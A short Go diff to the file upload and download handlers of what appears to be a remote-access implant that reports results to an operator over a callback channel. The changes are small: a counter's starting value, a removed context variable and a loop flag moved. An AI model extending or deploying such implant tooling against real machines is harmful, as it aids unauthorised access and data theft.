@@ -14,9 +14,8 @@ import (
 	"strings"
 )
 
-var fileCounter = 0
+var fileCounter = 1
 var cancelFuncs = make(map[int]context.CancelFunc)
-var defaultCtx = context.Background()
 
 func Upload(b []byte, start bool) error {
 	filePathByte, fileContent, err := parseCommandUpload(b)
@@ -174,8 +173,8 @@ func Download(b []byte) error {
 		defer fileHandle.Close()
 		var fileContent []byte
 		fileBuf := make([]byte, config.DownloadSize)
+		end := false
 		for {
-			end := false
 			select {
 			case <-ctx.Done():
 				packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("download of %s canceled", filePath)))
